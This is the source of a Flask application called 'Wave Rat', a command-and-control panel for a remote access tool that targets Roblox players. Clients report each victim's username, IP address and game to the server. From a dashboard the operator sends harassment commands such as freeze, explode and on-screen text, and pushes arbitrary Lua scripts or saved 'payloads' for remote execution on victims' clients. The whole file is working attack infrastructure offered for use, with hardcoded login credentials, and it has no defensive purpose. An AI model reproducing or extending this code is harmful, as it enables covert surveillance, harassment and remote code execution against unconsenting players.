from flask import Flask, request, jsonify, render_template_string, redirect, url_for, make_response, session
from flask_socketio import SocketIO
import time
import eventlet
from datetime import datetime
import json
import os
import secrets

eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = secrets.token_hex(32)
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"

socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

# ==================== CONFIG ====================
LOGIN = "entrepreneur1337"           # Change ici
PASSWORD = "A9f!Q3r#Zx7L@M2p$T8WkE%yC4H"        # Change ici
SESSION_DURATION = 24 * 3600

HISTORY_FILE = "history_log.json"
PAYLOADS_FILE = "payloads.json"

connected_players = {}
pending_kicks = {}
pending_commands = {}
history_log = []
payloads = {}

# ==================== CHARGEMENT ====================
def load_history():
    global history_log
    if os.path.exists(HISTORY_FILE):
        try:
            with open(HISTORY_FILE, 'r', encoding='utf-8') as f:
                history_log = json.load(f)
        except: history_log = []

def load_payloads():
    global payloads
    if os.path.exists(PAYLOADS_FILE):
        try:
            with open(PAYLOADS_FILE, 'r', encoding='utf-8') as f:
                payloads = json.load(f)
        except: payloads = {}

def save_payloads():
    try:
        with open(PAYLOADS_FILE, 'w', encoding='utf-8') as f:
            json.dump(payloads, f, ensure_ascii=False, indent=2)
    except: pass

load_history()
load_payloads()

# ==================== AUTH ====================
def is_authenticated():
    return session.get("authenticated") and session.get("expires", 0) > time.time()

def require_auth(f):
    def wrapper(*args, **kwargs):
        if not is_authenticated():
            return redirect(url_for("login_page"))
        return f(*args, **kwargs)
    wrapper.__name__ = f.__name__
    return wrapper

# ==================== LOGIN PAGE ====================
LOGIN_HTML = """<!DOCTYPE html>
<html lang="en" class="dark">
<head><meta charset="UTF-8"><title>Wave Rat - Login</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
<style>
    :root{--bg:#0f172a;--card:#1e293b;--border:#334155;--primary:#06b6d4;--text:#e2e8f0;}
    *{margin:0;padding:0;box-sizing:border-box;}
    body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;align-items:center;justify-content:center;}
    .login-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:3rem 4rem;max-width:420px;width:90%;box-shadow:0 30px 80px rgba(6,182,212,.2);}
    .logo svg{width:90px;height:90px;fill:var(--primary);}
    h1{font-size:2.2rem;text-align:center;margin-bottom:2rem;color:var(--primary);}
    input{width:100%;padding:16px;background:#0f172a;border:1px solid var(--border);border-radius:12px;color:white;margin-bottom:1rem;font-size:1rem;}
    button{width:100%;padding:16px;background:linear-gradient(135deg,#06b6d4,#0891b2);border:none;border-radius:12px;color:white;font-weight:600;cursor:pointer;}
    button:hover{transform:translateY(-4px);box-shadow:0 15px 30px rgba(6,182,212,.4);}
    .error{color:#ef4444;margin-top:15px;text-align:center;}
</style>
</head>
<body>
<div class="login-card">
    <div class="logo" style="text-align:center;margin-bottom:2rem;">
        <svg viewBox="0 0 738 738"><rect fill="#0f172a" width="738" height="738"></rect><path fill="#06b6d4" d="M550.16,367.53q0,7.92-.67,15.66c-5.55-17.39-19.61-44.32-53.48-44.32-50,0-54.19,44.6-54.19,44.6a22,22,0,0,1,18.19-9c12.51,0,19.71,4.92,19.71,18.19S468,415.79,448.27,415.79s-40.93-11.37-40.93-42.44c0-58.71,55.27-68.56,55.27-68.56-44.84-4.05-61.56,4.76-75.08,23.3-25.15,34.5-9.37,77.47-9.37,77.47s-33.87-18.95-33.87-74.24c0-89.28,91.33-100.93,125.58-87.19-23.74-23.75-43.4-29.53-69.11-29.53-62.53,0-108.23,60.13-108.23,111,0,44.31,34.85,117.16,132.31,117.16,86.66,0,95.46-55.09,86-69,36.54,36.57-17.83,84.12-86,84.12-28.87,0-105.17-6.55-150.89-79.59C208,272.93,334.58,202.45,334.58,202.45c-32.92-2.22-54.82,7.85-56.62,8.71a181,181,0,0,1,272.2,156.37Z"></path></svg>
        <h1>Wave Rat</h1>
    </div>
    <form method="post">
        <input type="text" name="login" placeholder="Login" required autofocus>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Connexion</button>
    </form>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
</div>
</body></html>"""

@app.route("/login", methods=["GET", "POST"])
def login_page():
    if is_authenticated():
        return redirect(url_for("index"))
    if request.method == "POST":
        if request.form.get("login") == LOGIN and request.form.get("password") == PASSWORD:
            session["authenticated"] = True
            session["expires"] = time.time() + SESSION_DURATION
            resp = make_response(redirect(url_for("index")))
            resp.set_cookie("session_token", secrets.token_hex(32), max_age=SESSION_DURATION, httponly=True, samesite="Lax")
            return resp
        return render_template_string(LOGIN_HTML, error="Mauvais identifiants")
    return render_template_string(LOGIN_HTML)

@app.route("/logout")
def logout():
    resp = make_response(redirect(url_for("login_page")))
    resp.delete_cookie("session_token")
    session.clear()
    return resp

# ==================== HISTORIQUE ====================
def add_history(event_type, username, details=""):
    timestamp = datetime.now().strftime("%H:%M:%S")
    history_log.insert(0, {"time": timestamp, "type": event_type, "username": username, "details": details})
    if len(history_log) > 100: history_log.pop()
    try:
        with open(HISTORY_FILE, 'w', encoding='utf-8') as f:
            json.dump(history_log, f, ensure_ascii=False, indent=2)
    except: pass
    socketio.emit("history_update", {"history": history_log[:50]})

# ==================== PANEL HTML (TOUT CORRIGÉ) ====================
HTML = """<!DOCTYPE html>
<html lang="en" class="dark">
<head>
<meta charset="UTF-8">
<title>Wave Rat Dashboard</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
<style>
    :root{--bg:#0f172a;--card:#1e293b;--border:#334155;--primary:#06b6d4;--primary-hover:#0891b2;--text:#e2e8f0;--text-muted:#94a3b8;}
    *{margin:0;padding:0;box-sizing:border-box;}
    body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;}
    .header{position:fixed;top:0;left:0;right:0;height:70px;background:rgba(15,23,42,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);z-index:1000;display:flex;align-items:center;padding:0 2rem;justify-content:space-between;}
    .logo{display:flex;align-items:center;gap:12px;font-weight:700;font-size:1.5rem;}
    .logo svg{width:40px;height:40px;fill:var(--primary);}
    .stats{font-size:1.1rem;color:var(--text-muted);}
    .stats b{color:var(--primary);font-weight:600;}
    .logout-btn{padding:8px 16px;background:#ef4444;border:none;border-radius:8px;color:white;cursor:pointer;font-size:0.9rem;}
    .main{flex:1;margin-top:70px;display:flex;}
    .sidebar{width:260px;background:rgba(30,41,59,0.95);border-right:1px solid var(--border);padding:1.5rem 0;}
    .nav-item{padding:1rem 2rem;cursor:pointer;transition:all .3s;color:var(--text-muted);font-weight:500;}
    .nav-item:hover{background:rgba(6,182,212,.15);color:var(--primary);}
    .nav-item.active{background:rgba(6,182,212,.25);color:var(--primary);border-left:4px solid var(--primary);}
    .content{flex:1;padding:2rem;overflow-y:auto;}
    .search-bar{margin-bottom:20px;}
    .search-bar input{width:100%;padding:14px;background:#0f172a;border:1px solid var(--border);border-radius:12px;color:white;font-size:1rem;}
    .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:1.5rem;}
    .card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:1.5rem;transition:all .4s;position:relative;overflow:hidden;}
    .card:hover{transform:translateY(-10px);box-shadow:0 25px 50px rgba(6,182,212,.25);border-color:var(--primary);}
    .card::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,transparent,var(--primary),transparent);opacity:0;transition:.4s;}
    .card:hover::before{opacity:1;}
    .status{display:flex;align-items:center;gap:8px;margin-bottom:12px;}
    .dot{width:10px;height:10px;border-radius:50%;background:#ef4444;box-shadow:0 0 10px #ef444430;}
    .dot.online{background:var(--primary);box-shadow:0 0 20px var(--primary);animation:pulse 2s infinite;}
    @keyframes pulse{0%,100%{opacity:1}50%{opacity:.7}}
    .name{font-size:1.3rem;font-weight:600;margin-bottom:8px;}
    .name a{color:var(--primary);text-decoration:none;}
    .info{font-size:.9rem;color:var(--text-muted);line-height:1.5;margin-bottom:16px;}
    .category{font-weight:bold;color:var(--primary);margin:16px 0 8px;font-size:.95rem;}
    .btn-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;}
    .btn{padding:10px;border:none;border-radius:10px;font-weight:600;font-size:.8rem;cursor:pointer;transition:all .3s;color:white;
         background:linear-gradient(135deg,#06b6d4,#0891b2);box-shadow:0 4px 15px rgba(6,182,212,.3);}
    .btn:hover{transform:translateY(-4px);box-shadow:0 10px 25px rgba(6,182,212,.5);}
    .btn.kick{background:linear-gradient(135deg,#ef4444,#dc2626);}
    .btn.undo{background:#475569;}
    .modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:2000;align-items:center;justify-content:center;}
    .modal.active{display:flex;}
    .modal-content{background:var(--card);border:2px solid var(--primary);border-radius:16px;width:90%;max-width:600px;padding:2rem;box-shadow:0 30px 80px rgba(6,182,212,.5);}
    .modal-content h2{color:var(--primary);margin-bottom:1rem;text-align:center;}
    input,textarea{width:100%;padding:14px;background:#0f172a;border:1px solid var(--border);border-radius:12px;color:white;margin-bottom:1rem;font-family:'JetBrains Mono',monospace;}
    .payload-list{max-height:300px;overflow-y:auto;border:1px solid var(--border);border-radius:12px;padding:10px;background:#0f172a;margin-bottom:1rem;}
    .payload-item{cursor:pointer;padding:12px;border-radius:8px;margin-bottom:8px;background:#1e293b;transition:.2s;}
    .payload-item:hover{background:#334155;}
    .payload-item.selected{background:var(--primary);color:black;}
    .modal-buttons{display:flex;gap:1rem;margin-top:1rem;}
    .modal-btn{flex:1;padding:14px;border:none;border-radius:12px;font-weight:600;cursor:pointer;}
    .confirm{background:var(--primary);color:white;}
    .confirm:hover{background:var(--primary-hover);}
    .cancel{background:#475569;color:white;}
    .toast-container{position:fixed;bottom:20px;right:20px;z-index:9999;}
    .toast{background:var(--card);border-left:5px solid var(--primary);padding:1rem 1.5rem;margin-top:1rem;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,.6);animation:slideIn .4s;}
    @keyframes slideIn{from{transform:translateX(100%)}to{transform:translateX(0)}}
</style>
</head>
<body>
<div class="header">
    <div class="logo">
        <svg viewBox="0 0 738 738"><rect fill="#0f172a" width="738" height="738"></rect><path fill="#06b6d4" d="M550.16,367.53q0,7.92-.67,15.66c-5.55-17.39-19.61-44.32-53.48-44.32-50,0-54.19,44.6-54.19,44.6a22,22,0,0,1,18.19-9c12.51,0,19.71,4.92,19.71,18.19S468,415.79,448.27,415.79s-40.93-11.37-40.93-42.44c0-58.71,55.27-68.56,55.27-68.56-44.84-4.05-61.56,4.76-75.08,23.3-25.15,34.5-9.37,77.47-9.37,77.47s-33.87-18.95-33.87-74.24c0-89.28,91.33-100.93,125.58-87.19-23.74-23.75-43.4-29.53-69.11-29.53-62.53,0-108.23,60.13-108.23,111,0,44.31,34.85,117.16,132.31,117.16,86.66,0,95.46-55.09,86-69,36.54,36.57-17.83,84.12-86,84.12-28.87,0-105.17-6.55-150.89-79.59C208,272.93,334.58,202.45,334.58,202.45c-32.92-2.22-54.82,7.85-56.62,8.71a181,181,0,0,1,272.2,156.37Z"></path></svg>
        <div>Wave Rat</div>
    </div>
    <div class="stats">Players online: <b id="stats">0</b></div>
    <a href="/logout"><button class="logout-btn">Déconnexion</button></a>
</div>

<div class="main">
    <div class="sidebar">
        <div class="nav-item active" data-tab="players">Players</div>
        <div class="nav-item" data-tab="workshop">Workshop</div>
        <div class="nav-item" data-tab="history">History</div>
    </div>
    <div class="content">
        <div id="players-tab" class="tab active">
            <div class="search-bar"><input type="text" id="searchInput" placeholder="Rechercher..." onkeyup="filterPlayers()"></div>
            <div class="grid" id="players"></div>
        </div>
        <div id="workshop-tab" class="tab" style="display:none;">
            <button class="btn" id="newPayloadBtn">+ New Payload</button>
            <div id="payloads-list" style="margin-top:20px;"></div>
        </div>
        <div id="history-tab" class="tab" style="display:none;"><div id="history"></div></div>
    </div>
</div>

<!-- Modals -->
<div class="modal" id="kickModal"><div class="modal-content"><h2>Kick</h2><input type="text" id="kickReason" placeholder="Raison (optionnel)"><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmKick">Kick</button></div></div></div>
<div class="modal" id="playSoundModal"><div class="modal-content"><h2>Sound</h2><input type="text" id="soundAssetId" placeholder="Asset ID"><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmSound">Jouer</button></div></div></div>
<div class="modal" id="textScreenModal"><div class="modal-content"><h2>Text Screen</h2><input type="text" id="screenText" placeholder="Texte à afficher" value="test"><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmText">Afficher</button></div></div></div>
<div class="modal" id="luaExecModal"><div class="modal-content"><h2>Exécuter Lua</h2><textarea id="luaScript" placeholder="Code Lua..." style="height:200px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmLua">Exécuter</button></div></div></div>
<div class="modal" id="importFileModal"><div class="modal-content"><h2>Importer Fichier</h2><input type="file" id="luaFileInput" accept=".lua,.txt"><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmImport">Exécuter</button></div></div></div>

<!-- Modal Création/Édition Payload -->
<div class="modal" id="payloadModal"><div class="modal-content">
    <h2 id="payloadModalTitle">Nouveau Payload</h2>
    <input type="text" id="payloadName" placeholder="Nom du payload">
    <textarea id="payloadCode" placeholder="Code Lua..." style="height:250px;"></textarea>
    <div class="modal-buttons">
        <button class="modal-btn cancel">Annuler</button>
        <button class="modal-btn confirm" id="savePayload">Sauvegarder</button>
    </div>
</div></div>

<!-- Modal Import Payload (100% fonctionnel) -->
<div class="modal" id="executePayloadModal"><div class="modal-content">
    <h2>Importer Payload</h2>
    <input type="text" id="payloadSearch" placeholder="Rechercher payload..." onkeyup="filterPayloads()">
    <div class="payload-list" id="payloadList"></div>
    <textarea id="tempPayloadCode" placeholder="Sélectionne un payload pour voir/editer le code..." style="height:200px;"></textarea>
    <div class="modal-buttons">
        <button class="modal-btn cancel">Annuler</button>
        <button class="modal-btn confirm" id="executeTempPayload">Exécuter</button>
    </div>
</div></div>

<div class="toast-container" id="toasts"></div>

<script>
const socket = io();
let currentPlayerId = null;
let editingPayloadName = null;

// Navigation
document.querySelectorAll('.nav-item').forEach(i => i.addEventListener('click', () => {
    document.querySelectorAll('.nav-item').forEach(x => x.classList.remove('active'));
    document.querySelectorAll('.tab').forEach(x => x.style.display = 'none');
    i.classList.add('active');
    document.getElementById(i.dataset.tab + '-tab').style.display = 'block';
    if (i.dataset.tab === 'workshop') loadPayloads();
}));

function toast(msg) {
    const t = document.createElement('div'); t.className = 'toast'; t.textContent = msg;
    document.getElementById('toasts').appendChild(t);
    setTimeout(() => t.remove(), 4000);
}

function filterPlayers() {
    const q = document.getElementById('searchInput').value.toLowerCase();
    document.querySelectorAll('.card').forEach(c => {
        c.style.display = c.textContent.toLowerCase().includes(q) ? 'block' : 'none';
    });
}

// === WORKSHOP PAYLOADS ===
function loadPayloads() {
    fetch('/payload?action=list').then(r => r.json()).then(data => {
        const list = document.getElementById('payloads-list');
        list.innerHTML = Object.keys(data).length === 0 ? '<p style="color:#94a3b8;padding:20px;">Aucun payload</p>' : '';
        for (const [name, code] of Object.entries(data)) {
            const div = document.createElement('div');
            div.style = 'background:#1e293b;padding:15px;border-radius:12px;margin-bottom:10px;';
            div.innerHTML = `
                <strong>${name}</strong><br>
                <span style="font-size:0.8rem;color:#94a3b8">${code.substr(0,100)}${code.length>100?'...':''}</span>
                <div style="margin-top:10px;">
                    <button class="btn" style="padding:6px 12px;font-size:0.8rem;" onclick="editPayload('${name}')">Edit</button>
                    <button class="btn kick" style="padding:6px 12px;font-size:0.8rem;" onclick="deletePayload('${name}')">Suppr</button>
                </div>`;
            list.appendChild(div);
        }
    });
}

document.getElementById('newPayloadBtn').onclick = () => {
    editingPayloadName = null;
    document.getElementById('payloadModalTitle').textContent = 'Nouveau Payload';
    document.getElementById('payloadName').value = '';
    document.getElementById('payloadCode').value = '';
    document.getElementById('payloadModal').classList.add('active');
};

window.editPayload = name => {
    fetch(`/payload?action=get&name=${encodeURIComponent(name)}`).then(r => r.json()).then(d => {
        editingPayloadName = name;
        document.getElementById('payloadModalTitle').textContent = 'Modifier Payload';
        document.getElementById('payloadName').value = name;
        document.getElementById('payloadCode').value = d.code;
        document.getElementById('payloadModal').classList.add('active');
    });
};

window.deletePayload = name => {
    if (confirm('Supprimer ' + name + ' ?')) {
        fetch('/payload', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'delete',name})})
            .then(() => { toast('Payload supprimé'); loadPayloads(); });
    }
};

document.getElementById('savePayload').onclick = () => {
    const name = document.getElementById('payloadName').value.trim();
    const code = document.getElementById('payloadCode').value.trim();
    if (!name || !code) return toast('Nom + code requis');
    fetch('/payload', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({
            action: editingPayloadName ? 'update' : 'create',
            name: name,
            code: code,
            oldname: editingPayloadName
        })
    }).then(() => {
        toast(editingPayloadName ? 'Payload modifié' : 'Payload créé');
        document.getElementById('payloadModal').classList.remove('active');
        loadPayloads();
    });
};

// === IMPORT PAYLOAD (100% fonctionnel) ===
function openPayloadSelector(id) {
    currentPlayerId = id;
    fetch("/payload?action=list").then(r => r.json()).then(data => {
        const list = document.getElementById("payloadList");
        list.innerHTML = "";
        if (Object.keys(data).length === 0) {
            list.innerHTML = "<p style='color:#94a3b8;text-align:center;padding:20px;'>Aucun payload disponible</p>";
        } else {
            for (const name of Object.keys(data)) {
                const item = document.createElement("div");
                item.className = "payload-item";
                item.textContent = name;
                item.onclick = () => {
                    document.querySelectorAll('.payload-item').forEach(x => x.classList.remove('selected'));
                    item.classList.add('selected');
                    fetch("/payload?action=get&name=" + encodeURIComponent(name)).then(r => r.json()).then(d => {
                        document.getElementById("tempPayloadCode").value = d.code;
                    });
                };
                list.appendChild(item);
            }
        }
        document.getElementById("executePayloadModal").classList.add("active");
    });
}

function filterPayloads() {
    const q = document.getElementById('payloadSearch').value.toLowerCase();
    document.querySelectorAll('.payload-item').forEach(i => {
        i.style.display = i.textContent.toLowerCase().includes(q) ? 'block' : 'none';
    });
}

document.getElementById('executeTempPayload').onclick = () => {
    const code = document.getElementById('tempPayloadCode').value.trim();
    if (!code) return toast('Aucun code à exécuter');
    sendTroll(currentPlayerId, 'luaexec', code);
    document.getElementById('executePayloadModal').classList.remove('active');
};

// === MODALS CLASSIQUES ===
function openKickModal(id) { currentPlayerId = id; document.getElementById('kickModal').classList.add('active'); }
function openPlaySoundModal(id) { currentPlayerId = id; document.getElementById('playSoundModal').classList.add('active'); }
function openTextScreenModal(id) { currentPlayerId = id; document.getElementById('textScreenModal').classList.add('active'); }
function openLuaExecModal(id) { currentPlayerId = id; document.getElementById('luaExecModal').classList.add('active'); }
function openImportFileModal(id) { currentPlayerId = id; document.getElementById('importFileModal').classList.add('active'); }

document.querySelectorAll('.modal .cancel').forEach(b => b.addEventListener('click', () => b.closest('.modal').classList.remove('active')));

function sendTroll(id, cmd, param = null) {
    const body = { userid: id, cmd };
    if (param) {
        if (cmd === 'playsound') body.assetId = param;
        else if (cmd === 'textscreen') body.text = param;
        else if (cmd === 'luaexec') body.script = param;
    }
    fetch('/troll', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
    toast(cmd.toUpperCase() + ' envoyé');
}

document.getElementById('confirmKick').onclick = () => {
    const reason = document.getElementById('kickReason').value.trim() || 'Kicked';
    fetch('/kick', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ userid: currentPlayerId, reason }) });
    toast('KICK envoyé');
    document.getElementById('kickModal').classList.remove('active');
};

document.getElementById('confirmSound').onclick = () => {
    const asset = document.getElementById('soundAssetId').value.trim();
    if (asset) sendTroll(currentPlayerId, 'playsound', asset);
    document.getElementById('playSoundModal').classList.remove('active');
};

document.getElementById('confirmText').onclick = () => {
    const text = document.getElementById('screenText').value.trim();
    if (text) sendTroll(currentPlayerId, 'textscreen', text);
    document.getElementById('textScreenModal').classList.remove('active');
};

document.getElementById('confirmLua').onclick = () => {
    const script = document.getElementById('luaScript').value.trim();
    if (script) sendTroll(currentPlayerId, 'luaexec', script);
    document.getElementById('luaExecModal').classList.remove('active');
};

document.getElementById('confirmImport').onclick = () => {
    const file = document.getElementById('luaFileInput').files[0];
    if (!file) return toast('Aucun fichier');
    const reader = new FileReader();
    reader.onload = e => { sendTroll(currentPlayerId, 'luaexec', e.target.result); document.getElementById('importFileModal').classList.remove('active'); };
    reader.readAsText(file);
};

// === RENDER ===
function render(data) {
    document.getElementById('stats').innerText = data.online;
    const grid = document.getElementById('players');
    const current = new Set(Object.keys(data.players));
    Object.entries(data.players).forEach(([id, p]) => {
        let card = document.getElementById(`card_${id}`);
        if (!card) { card = document.createElement('div'); card.className = 'card'; card.id = `card_${id}`; grid.appendChild(card); }
        card.innerHTML = `
            <div class="status"><div class="dot ${p.online?'online':''}"></div><span>${p.online?'Online':'Offline'}</span></div>
            <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (${id})</div>
            <div class="info">
                Executor: ${p.executor}<br>
                IP: ${p.ip}<br>
                Game: <a href="https://www.roblox.com/games/${p.gameId}" target="_blank">${p.game}</a><br>
                JobId: ${p.jobId || "N/A"}
            </div>
            <div class="category">TROLLS</div>
            <div class="btn-grid">
                <button class="btn kick" onclick="openKickModal('${id}')">KICK</button>
                <button class="btn" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                <button class="btn" onclick="sendTroll('${id}','spin')">SPIN</button>
                <button class="btn" onclick="sendTroll('${id}','jump')">JUMP</button>
                <button class="btn" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
                <button class="btn" onclick="sendTroll('${id}','explode')">EXPLODE</button>
                <button class="btn" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
                <button class="btn" onclick="openPlaySoundModal('${id}')">SOUND</button>
                <button class="btn" onclick="openTextScreenModal('${id}')">TEXT</button>
            </div>
            <div class="category">UNDO</div>
            <div class="btn-grid">
                <button class="btn undo" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
                <button class="btn undo" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
                <button class="btn undo" onclick="sendTroll('${id}','unrainbow')">STOP RAINBOW</button>
                <button class="btn undo" onclick="sendTroll('${id}','uninvisible')">VISIBLE</button>
                <button class="btn undo" onclick="sendTroll('${id}','stopsound')">STOP SOUND</button>
                <button class="btn undo" onclick="sendTroll('${id}','hidetext')">HIDE TEXT</button>
            </div>
            <div class="category">LUA</div>
            <div class="btn-grid" style="grid-template-columns:1fr 1fr 1fr">
                <button class="btn" onclick="openImportFileModal('${id}')">FILE</button>
                <button class="btn" onclick="openLuaExecModal('${id}')">EXEC</button>
                <button class="btn" onclick="openPayloadSelector('${id}')">PAYLOAD</button>
            </div>
        `;
    });
    document.querySelectorAll('.card').forEach(c => { if (!current.has(c.id.replace('card_',''))) c.remove(); });
}

function renderHistory(d) {
    document.getElementById('history').innerHTML = d.history.map(h => `<div style="background:#1e293b;padding:12px;border-radius:12px;margin-bottom:8px;"><strong>[${h.time}] ${h.username}</strong><br><span style="color:#94a3b8">${h.details}</span></div>`).join('');
}

socket.on('update', render);
socket.on('history_update', renderHistory);
socket.on('kick_notice', d => toast(d.username + ' → ' + d.reason));
fetch('/get_history').then(r => r.json()).then(renderHistory);
</script>
</body>
</html>"""

# ==================== ROUTES ====================
@app.route("/")
@require_auth
def index():
    return render_template_string(HTML)

@app.route("/get_history")
@require_auth
def get_history():
    return jsonify({"history": history_log[:50]})

@app.route("/api", methods=["GET", "POST"])
def api():
    now = time.time()
    if request.method == "POST":
        try:
            d = request.get_json(silent=True) or {}
            uid = str(d["userid"])
            if d.get("action") == "register":
                username = d.get("username", "Unknown")
                connected_players[uid] = {
                    "username": username, "executor": d.get("executor", "Unknown"),
                    "ip": d.get("ip", "Unknown"), "last": now, "online": True,
                    "game": d.get("game", "Unknown"), "gameId": d.get("gameId", 0),
                    "jobId": d.get("jobId", "Unknown")
                }
                add_history("connect", username, f"Connecté depuis {d.get('game','?')}")
            elif d.get("action") == "heartbeat" and uid in connected_players:
                connected_players[uid]["last"] = now
        except: pass
        return jsonify({"ok": True})

    uid = request.args.get("userid", "")
    if not uid: return jsonify({})
    if uid in pending_kicks:
        reason = pending_kicks.pop(uid, "Kicked")
        return jsonify({"command": "kick", "reason": reason})
    if uid in pending_commands:
        cmd = pending_commands.pop(uid)
        res = {"command": cmd.get("cmd") if isinstance(cmd, dict) else cmd}
        if isinstance(cmd, dict):
            res.update({k: cmd[k] for k in ["assetId", "text", "script"] if k in cmd})
        return jsonify(res)
    return jsonify({})

@app.route("/kick", methods=["POST"])
@require_auth
def kick():
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    reason = data.get("reason", "No reason")
    pending_kicks[uid] = reason
    name = connected_players.get(uid, {}).get("username", "Unknown")
    add_history("action", name, f"KICKED: {reason}")
    socketio.emit("kick_notice", {"username": name, "reason": f"KICK: {reason}"})
    return jsonify({"sent": True})

@app.route("/troll", methods=["POST"])
@require_auth
def troll():
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    cmd = data.get("cmd", "")
    if uid and cmd:
        payload = {"cmd": cmd}
        details = cmd.upper()
        if "assetId" in data: payload["assetId"] = data["assetId"]; details += f" ({data['assetId']})"
        if "text" in data: payload["text"] = data["text"]; details += f" ({data['text']})"
        if "script" in data: payload["script"] = data["script"]; details += " (Lua)"
        pending_commands[uid] = payload
        name = connected_players.get(uid, {}).get("username", "Unknown")
        add_history("action", name, details)
        socketio.emit("kick_notice", {"username": name, "reason": cmd.upper()})
    return jsonify({"sent": True})

@app.route("/payload", methods=["GET", "POST"])
@require_auth
def payload_manager():
    if request.method == "GET":
        action = request.args.get("action")
        if action == "list": return jsonify(payloads)
        if action == "get": return jsonify({"code": payloads.get(request.args.get("name", ""), "")})
    else:
        data = request.get_json() or {}
        action = data.get("action")
        if action == "create":
            payloads[data["name"]] = data["code"]
        elif action == "update":
            if data.get("oldname") and data["oldname"] in payloads:
                del payloads[data["oldname"]]
            payloads[data["name"]] = data["code"]
        elif action == "delete":
            payloads.pop(data.get("name"), None)
        save_payloads()
        return jsonify({"ok": True})
    return jsonify({"error": "invalid"})

# ==================== LOOP ====================
def broadcast_loop():
    while True:
        now = time.time()
        online = 0
        to_remove = []
        for uid, p in list(connected_players.items()):
            if now - p["last"] > 30:
                to_remove.append(uid)
            else:
                was_online = p["online"]
                p["online"] = now - p["last"] < 15
                if was_online and not p["online"]:
                    add_history("disconnect", p["username"], "Perdu")
                if p["online"]: online += 1
        for uid in to_remove:
            username = connected_players.pop(uid, {}).get("username", "Unknown")
            add_history("disconnect", username, "Déconnecté")
        socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
        socketio.sleep(2)

if __name__ == "__main__":
    socketio.start_background_task(broadcast_loop)
    socketio.run(app, host="0.0.0.0", port=5000)


